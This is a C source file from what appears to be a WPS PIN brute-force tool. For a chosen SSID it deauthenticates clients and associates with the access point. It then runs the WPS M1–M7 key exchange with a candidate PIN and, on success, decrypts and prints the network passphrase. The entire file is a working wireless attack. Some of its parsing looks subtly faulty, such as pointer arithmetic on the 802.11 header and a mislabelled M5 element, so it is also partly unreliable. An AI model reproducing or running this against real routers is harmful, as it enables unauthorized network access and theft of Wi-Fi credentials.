#include "wps_transaction.h"

uint8_t status = 0;
pcap_t *inthandle;

void alarm_handler(int sig) {
  status = 1;
  pcap_breakloop(inthandle);
}

void wait_for_target_beacon(unsigned char *user, const struct pcap_pkthdr *h,
                            const unsigned char *p) {
  int len, cmpresult, wastarget = 0;
  loopinfo *thisloopinfo = (loopinfo *)user;
  returninfo *retinfo = thisloopinfo->ret;
  len = get_radiotap_header_len(thisloopinfo->handle, p);

  tagged_parameter *par;

  memcpy((void *)&retinfo->targetmac,
         &((ieee802dot11_header *)(p + len))->addr2, sizeof(MAC));
  memcpy((void *)&((retinfo->wps).mac),
         &((ieee802dot11_header *)(p + len))->addr2, sizeof(MAC));

  len += sizeof(ieee802dot11_header) + 12;
  while (len < h->len) {
    par = (tagged_parameter *)(p + len);
    if (par->number == 1) {
      if ((retinfo->rates = malloc(par->len))) {
        memcpy((void *)retinfo->rates, p + len + sizeof(tagged_parameter),
               par->len);
        retinfo->rates_len = par->len;
      }
    }
    if (par->number == 0) {
      if (par->len == strlen(thisloopinfo->targetssid)) {
        cmpresult = strncmp((const char *)(p + len + sizeof(tagged_parameter)),
                            (const char *)thisloopinfo->targetssid, par->len);
        if (cmpresult == 0)
          wastarget = 1;
      }
    }
    len += sizeof(tagged_parameter) + par->len;
  }
  if (wastarget) {
    pcap_breakloop(thisloopinfo->handle);
  }
  return;
}

void wait_for_auth(unsigned char *user, const struct pcap_pkthdr *h,
                   const unsigned char *p) {
  int len;
  uint16_t type;
  loopinfo *thisloopinfo = (loopinfo *)user;
  len = get_radiotap_header_len(thisloopinfo->handle, p);
  ieee802dot11_header *header = (ieee802dot11_header *)(p + len);

  type = (((header->framecontrol >> 8) | (header->framecontrol << 8)) >> 12) &
         0b0000000000001111;
  if (type == 0x0b) {
    if (*((uint16_t *)(header + sizeof(ieee802dot11_header) + 4)) == 0) {
      pcap_breakloop(thisloopinfo->handle);
    }
  }

  return;
}

void wait_for_assoc(unsigned char *user, const struct pcap_pkthdr *h,
                    const unsigned char *p) {
  int len;
  uint16_t type;
  loopinfo *thisloopinfo = (loopinfo *)user;
  len = get_radiotap_header_len(thisloopinfo->handle, p);
  ieee802dot11_header *header = (ieee802dot11_header *)(p + len);

  type = (((header->framecontrol >> 8) | (header->framecontrol << 8)) >> 12) &
         0b0000000000001111;
  if (type == 0x01) {
    if (*((uint16_t *)(header + sizeof(ieee802dot11_header) + 4)) == 0) {
      pcap_breakloop(thisloopinfo->handle);
    }
  }

  return;
}

void wait_for_identity_request(unsigned char *user, const struct pcap_pkthdr *h,
                               const unsigned char *p) {
  int len;
  uint16_t type;
  loopinfo *thisloopinfo = (loopinfo *)user;
  len = get_radiotap_header_len(thisloopinfo->handle, p);
  ieee802dot11_header *header = (ieee802dot11_header *)(p + len);
  llc_header *llc = (llc_header *)(((uint8_t *)header) + sizeof(*header));
  eap_header *eap = (eap_header *)(((uint8_t *)llc) + sizeof(*llc) +
                                   sizeof(ieee802dot1x_header));
  type = (((header->framecontrol >> 8) | (header->framecontrol << 8)) >> 12) &
         0b0000000000110000;

  if (type == 0x20) {
    if (llc->type == 0x8e88 && eap->id == 0) {
      pcap_breakloop(thisloopinfo->handle);
    }
  }

  return;
}

void wait_for_m1(unsigned char *user, const struct pcap_pkthdr *h,
                 const unsigned char *p) {
  int len;
  uint16_t type, hlen;
  loopinfo *thisloopinfo = (loopinfo *)user;
  returninfo *retinfo = thisloopinfo->ret;
  len = get_radiotap_header_len(thisloopinfo->handle, p);

  ieee802dot11_header *header = (ieee802dot11_header *)(p + len);
  llc_header *llc = (llc_header *)(((uint8_t *)header) + sizeof(*header));
  eap_header *eap = (eap_header *)(((uint8_t *)llc) + sizeof(*llc) +
                                   sizeof(ieee802dot1x_header));
  wfa_expanded_header *wfa =
      (wfa_expanded_header *)(((uint8_t *)eap) + sizeof(*eap));
  wfa_element_header *wfa_elem;
  len = (uint8_t *)(((uint8_t *)wfa) + sizeof(*wfa)) - (uint8_t *)p;
  type = (((header->framecontrol >> 8) | (header->framecontrol << 8)) >> 12) &
         0b0000000000110000;

  if (type == 0x20) {
    if (llc->type == 0x8e88 && eap->id == 1) {
      if ((retinfo->wps).last_msg)
        free((retinfo->wps).last_msg);
      (retinfo->wps).last_msg_len =
          ntohs(eap->length) - sizeof(*eap) - sizeof(*wfa);
      (retinfo->wps).last_msg = malloc((retinfo->wps).last_msg_len);
      memcpy((void *)((retinfo->wps).last_msg),
             ((uint8_t *)eap) + sizeof(*eap) + sizeof(*wfa),
             (retinfo->wps).last_msg_len);

      while (len < h->len) {
        wfa_elem = (wfa_element_header *)(p + len);
        hlen = ntohs(wfa_elem->length);
        if (wfa_elem->type == 0x1a10) // N_1
        {
          memcpy((void *)((retinfo->wps).n1),
                 p + len + sizeof(wfa_element_header), hlen);
        }
        if (wfa_elem->type == 0x3210) // PK_E
        {
          memcpy((void *)((retinfo->wps).pke),
                 p + len + sizeof(wfa_element_header), hlen);
        }
        len += sizeof(wfa_element_header) + hlen;
      }
      pcap_breakloop(thisloopinfo->handle);
    }
  }

  return;
}

void wait_for_m3(unsigned char *user, const struct pcap_pkthdr *h,
                 const unsigned char *p) {
  int len;
  uint16_t type, hlen;
  loopinfo *thisloopinfo = (loopinfo *)user;
  returninfo *retinfo = thisloopinfo->ret;
  len = get_radiotap_header_len(thisloopinfo->handle, p);

  ieee802dot11_header *header = (ieee802dot11_header *)(p + len);
  llc_header *llc = (llc_header *)(((uint8_t *)header) + sizeof(*header));
  eap_header *eap = (eap_header *)(((uint8_t *)llc) + sizeof(*llc) +
                                   sizeof(ieee802dot1x_header));
  wfa_expanded_header *wfa =
      (wfa_expanded_header *)(((uint8_t *)eap) + sizeof(*eap));
  wfa_element_header *wfa_elem;
  len = (uint8_t *)(((uint8_t *)wfa) + sizeof(*wfa)) - (uint8_t *)p;
  type = (((header->framecontrol >> 8) | (header->framecontrol << 8)) >> 12) &
         0b0000000000110000;

  if (type == 0x20) {
    if (llc->type == 0x8e88 && eap->id == 2) {
      if (wfa->opcode == 3) // WSC_NACK
      {
        status = 2;
      } else {
        if ((retinfo->wps).last_msg)
          free((retinfo->wps).last_msg);
        (retinfo->wps).last_msg_len =
            ntohs(eap->length) - sizeof(*eap) - sizeof(*wfa);
        (retinfo->wps).last_msg = malloc((retinfo->wps).last_msg_len);
        memcpy((void *)((retinfo->wps).last_msg),
               ((uint8_t *)eap) + sizeof(*eap) + sizeof(*wfa),
               (retinfo->wps).last_msg_len);

        while (len < h->len) {
          wfa_elem = (wfa_element_header *)(p + len);
          hlen = ntohs(wfa_elem->length);
          if (wfa_elem->type == 0x1410) // EHASH1
          {
            memcpy((void *)((retinfo->wps).ehash1),
                   p + len + sizeof(wfa_element_header), hlen);
          }
          if (wfa_elem->type == 0x1510) // EHASH2
          {
            memcpy((void *)((retinfo->wps).ehash2),
                   p + len + sizeof(wfa_element_header), hlen);
          }
          len += sizeof(wfa_element_header) + hlen;
        }
      }
      pcap_breakloop(thisloopinfo->handle);
    }
  }

  return;
}

void wait_for_m5(unsigned char *user, const struct pcap_pkthdr *h,
                 const unsigned char *p) {
  int len;
  uint16_t type, hlen;
  loopinfo *thisloopinfo = (loopinfo *)user;
  returninfo *retinfo = thisloopinfo->ret;
  len = get_radiotap_header_len(thisloopinfo->handle, p);

  ieee802dot11_header *header = (ieee802dot11_header *)(p + len);
  llc_header *llc = (llc_header *)(((uint8_t *)header) + sizeof(*header));
  eap_header *eap = (eap_header *)(((uint8_t *)llc) + sizeof(*llc) +
                                   sizeof(ieee802dot1x_header));
  wfa_expanded_header *wfa =
      (wfa_expanded_header *)(((uint8_t *)eap) + sizeof(*eap));
  wfa_element_header *wfa_elem;
  len = (uint8_t *)(((uint8_t *)wfa) + sizeof(*wfa)) - (uint8_t *)p;
  type = (((header->framecontrol >> 8) | (header->framecontrol << 8)) >> 12) &
         0b0000000000110000;

  if (type == 0x20) {
    if (llc->type == 0x8e88 && eap->id == 3) {
      if (wfa->opcode == 3) // WSC_NACK
      {
        status = 3;
      } else {
        if ((retinfo->wps).last_msg)
          free((retinfo->wps).last_msg);
        (retinfo->wps).last_msg_len =
            ntohs(eap->length) - sizeof(*eap) - sizeof(*wfa);
        (retinfo->wps).last_msg = malloc((retinfo->wps).last_msg_len);
        memcpy((void *)((retinfo->wps).last_msg),
               ((uint8_t *)eap) + sizeof(*eap) + sizeof(*wfa),
               (retinfo->wps).last_msg_len);

        while (len < h->len) {
          wfa_elem = (wfa_element_header *)(p + len);
          hlen = ntohs(wfa_elem->length);
          if (wfa_elem->type == 0x1810) // EHASH1
          {
            memcpy((void *)((retinfo->wps).ehash1),
                   p + len + sizeof(wfa_element_header), hlen);
          }
          len += sizeof(wfa_element_header) + hlen;
        }
      }
      pcap_breakloop(thisloopinfo->handle);
    }
  }

  return;
}

void wait_for_m7(unsigned char *user, const struct pcap_pkthdr *h,
                 const unsigned char *p) {
  int len;
  uint16_t type, hlen;
  loopinfo *thisloopinfo = (loopinfo *)user;
  returninfo *retinfo = thisloopinfo->ret;
  len = get_radiotap_header_len(thisloopinfo->handle, p);

  ieee802dot11_header *header = (ieee802dot11_header *)(p + len);
  llc_header *llc = (llc_header *)(((uint8_t *)header) + sizeof(*header));
  eap_header *eap = (eap_header *)(((uint8_t *)llc) + sizeof(*llc) +
                                   sizeof(ieee802dot1x_header));
  wfa_expanded_header *wfa =
      (wfa_expanded_header *)(((uint8_t *)eap) + sizeof(*eap));
  wfa_element_header *wfa_elem;
  len = (uint8_t *)(((uint8_t *)wfa) + sizeof(*wfa)) - (uint8_t *)p;
  type = (((header->framecontrol >> 8) | (header->framecontrol << 8)) >> 12) &
         0b0000000000110000;

  if (type == 0x20) {
    if (llc->type == 0x8e88 && eap->id == 4) {
      if (wfa->opcode == 3) // WSC_NACK
      {
        status = 4;
      } else {
        if ((retinfo->wps).last_msg)
          free((retinfo->wps).last_msg);
        (retinfo->wps).last_msg_len =
            ntohs(eap->length) - sizeof(*eap) - sizeof(*wfa);
        (retinfo->wps).last_msg = malloc((retinfo->wps).last_msg_len);
        memcpy((void *)((retinfo->wps).last_msg),
               ((uint8_t *)eap) + sizeof(*eap) + sizeof(*wfa),
               (retinfo->wps).last_msg_len);

        while (len < h->len) {
          wfa_elem = (wfa_element_header *)(p + len);
          hlen = ntohs(wfa_elem->length);
          if (wfa_elem->type == 0x1810) // Encrypted Password
          {
            (retinfo->wps).enc_key = malloc(hlen);
            if ((retinfo->wps).enc_key) {
              memcpy((void *)((retinfo->wps).enc_key),
                     p + len + sizeof(wfa_element_header), hlen);
              (retinfo->wps).enc_key_len = hlen;
            } else
              fprintf(stderr, "Could not allocate memory for Passphrase\n");
          }
          len += sizeof(wfa_element_header) + hlen;
        }
      }
      pcap_breakloop(thisloopinfo->handle);
    }
  }

  return;
}

int timeout_loop_wrapper(pcap_t *handle, uint8_t timeout,
                         void (*func)(unsigned char *,
                                      const struct pcap_pkthdr *,
                                      const unsigned char *),
                         u_char *myloopinfo) {
  int tmp;
  alarm(timeout);
  pcap_loop(handle, -1, func, myloopinfo);
  alarm(0);
  tmp = status;
  status = 0;
  return tmp;
}

int decrypt_password(returninfo *retinfo) {
  int i;
  int hlen;
  wfa_element_header *wfa_elem;

  aes_128_cbc_decrypt(retinfo->wps.keywrapkey, retinfo->wps.enc_key,
                      ((uint8_t *)retinfo->wps.enc_key) + 16,
                      retinfo->wps.enc_key_len);

  i = 0;
  while (i < (retinfo->wps.enc_key_len - 16)) {
    wfa_elem =
        (wfa_element_header *)(((uint8_t *)retinfo->wps.enc_key) + i + 16);
    hlen = ntohs(wfa_elem->length);
    if (wfa_elem->type == 0x2710) // Password
    {
      printf("\n Passwort:\n");
      for (i = 0; i < hlen; i++)
        printf("%c", ((uint8_t *)wfa_elem + sizeof(wfa_element_header))[i]);
      printf("\n");
      return 0;
    }
    i += sizeof(wfa_element_header) + hlen;
  }

  return -1;
}

int doexchange(pcap_t *handle, char *targetssid, uint8_t *wpspin, MAC *mymac) {
  signal(SIGALRM, alarm_handler);
  inthandle = handle;
  // string buffers
  char filterbuf[28];
  // state
  loopinfo myloopinfo;
  returninfo retinfo;
  // reusable variables
  struct bpf_program bpg;
  int ret = 0;
  int i;

  printf("trying pin ");
  for (i = 0; i < 8; i++)
    printf("%c", wpspin[i]);
  printf(": ");

  // initialize state to transfer to pcap loops
  myloopinfo.handle = handle;
  myloopinfo.targetssid = targetssid;
  myloopinfo.ret = &retinfo;
  retinfo.wps.last_msg = NULL;

  // Filter Incomming packages for Beacon frames
  pcap_compile(handle, &bpg, "wlan type mgt subtype beacon", 1,
               PCAP_NETMASK_UNKNOWN);
  pcap_setfilter(handle, &bpg);

  // attach frame handler, that waits for target SSID beacon
  pcap_loop(handle, -1, &wait_for_target_beacon, (u_char *)&myloopinfo);

  // Filter Incomming packages for our MAC Address
  sprintf(filterbuf, "ether dst %02x:%02x:%02x:%02x:%02x:%02x",
          ((uint8_t *)mymac)[0], ((uint8_t *)mymac)[1], ((uint8_t *)mymac)[2],
          ((uint8_t *)mymac)[3], ((uint8_t *)mymac)[4], ((uint8_t *)mymac)[5]);
  pcap_compile(handle, &bpg, filterbuf, 1, PCAP_NETMASK_UNKNOWN);
  pcap_setfilter(handle, &bpg);

  printf("deauth...");
  deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
  printf("Auth...");
  // authenticate ourselfs
  authenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
  // wait for authentication response
  ret = timeout_loop_wrapper(handle, 3, &wait_for_auth, (u_char *)&myloopinfo);
  if (ret != 0) {
    printf("deauth...");
    deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
    return ret;
  }

  printf("Assoc...");
  // associate
  associate(handle, targetssid, retinfo.rates, retinfo.rates_len,
            retinfo.targetmac, *mymac, retinfo.targetmac);
  // wait for authentication response
  ret = timeout_loop_wrapper(handle, 1, &wait_for_assoc, (u_char *)&myloopinfo);
  if (ret != 0) {
    printf("deauth...");
    deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
    return ret;
  }

  printf("EAPoL...");
  // start eapol
  eapol_start(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
  ret = timeout_loop_wrapper(handle, 1, &wait_for_identity_request,
                             (u_char *)&myloopinfo);
  if (ret != 0) {
    printf("deauth...");
    deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
    return ret;
  }
  eap_identity_response(handle, retinfo.targetmac, *mymac, retinfo.targetmac);

  // key exchange
  ret = timeout_loop_wrapper(handle, 2, &wait_for_m1, (u_char *)&myloopinfo);
  if (ret != 0) {
    printf("deauth(1)...");
    send_wsc_nack(handle, 1, &retinfo.wps, retinfo.targetmac, *mymac,
                  retinfo.targetmac);
    deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
    return ret;
  }
  printf("M1...");
  fflush(stdout);
  wps_build_key(&retinfo.wps, wpspin);
  send_m2(handle, &retinfo.wps, retinfo.targetmac, *mymac, retinfo.targetmac);
  printf("M2...");
  fflush(stdout);
  ret = timeout_loop_wrapper(handle, 3, &wait_for_m3, (u_char *)&myloopinfo);
  if (ret != 0) {
    printf("deauth(2)...");
    send_wsc_nack(handle, 2, &retinfo.wps, retinfo.targetmac, *mymac,
                  retinfo.targetmac);
    deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
    return ret;
  }
  printf("M3...");
  fflush(stdout);
  send_m4(handle, &retinfo.wps, retinfo.targetmac, *mymac, retinfo.targetmac);
  printf("M4...");
  fflush(stdout);
  ret = timeout_loop_wrapper(handle, 3, &wait_for_m5, (u_char *)&myloopinfo);
  if (ret != 0) {
    printf("deauth(3)...");
    send_wsc_nack(handle, 3, &retinfo.wps, retinfo.targetmac, *mymac,
                  retinfo.targetmac);
    deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
    return ret;
  }
  printf("M5...");
  fflush(stdout);
  send_m6(handle, &retinfo.wps, retinfo.targetmac, *mymac, retinfo.targetmac);
  printf("M6...");
  fflush(stdout);
  ret = timeout_loop_wrapper(handle, 3, &wait_for_m7, (u_char *)&myloopinfo);
  if (ret != 0) {
    printf("deauth(4)...");
    send_wsc_nack(handle, 4, &retinfo.wps, retinfo.targetmac, *mymac,
                  retinfo.targetmac);
    // deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);
    return ret;
  }
  printf("M7...");
  fflush(stdout);

  printf("deauth...");
  send_wsc_nack(handle, 4, &retinfo.wps, retinfo.targetmac, *mymac,
                retinfo.targetmac);
  deauthenticate(handle, retinfo.targetmac, *mymac, retinfo.targetmac);

  return decrypt_password(&retinfo);
}
